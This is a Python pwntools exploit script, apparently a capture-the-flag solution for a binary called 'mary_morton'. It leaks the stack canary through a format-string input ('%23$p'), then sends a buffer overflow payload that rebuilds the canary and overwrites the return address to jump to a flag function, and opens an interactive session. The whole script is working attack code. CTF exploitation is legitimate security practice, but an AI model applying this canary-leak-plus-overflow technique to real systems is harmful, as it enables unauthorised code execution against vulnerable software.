from pwn import *
from pwnlib.tubes import *
from pwnlib.util.packing import *
from pwnlib.tubes.process import *
from pwnlib.tubes.remote import *
import struct
import time

local = True
#local = False

if local:
    r = process("./mary_morton")
    gdb.attach(r)
else:
    r = remote(HOST, PORT)


getFlag = p64(0x004008da)
target = "./mary_morton"
binary = ELF ( target )

context.update(arch='i686', os='linux')
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

def getConn(local):
    #return process('./swap', env = {"LD_PRELOAD":"./libc.so.6"}) if local else remote('pwn1.chal.ctf.westerns.tokyo', 19937)
    #return process(target) if local else remote('pwn1.chal.ctf.westerns.tokyo', 19937)
    return remote('localhost',40645)
def send(s):
    print s
    r.sendline(s)
def getMenu(s):
    print s.recvuntil('Exit the battle \n')
#r = getConn(local)
getMenu(r)
send("2")
send("%23$p")
leak = r.recvline()
print leak
leak_canary= int(leak, 16)
print "Leak Value :  0x%x"%leak_canary
getMenu(r)
r.send("1")
payload = "A"*(16*8+8)+p64(leak_canary)+"B"*8+getFlag+p64(0)+"C"*100
r.send(payload)
log.info("Send Payload")
r.recvline()
r.interactive()
r.close()
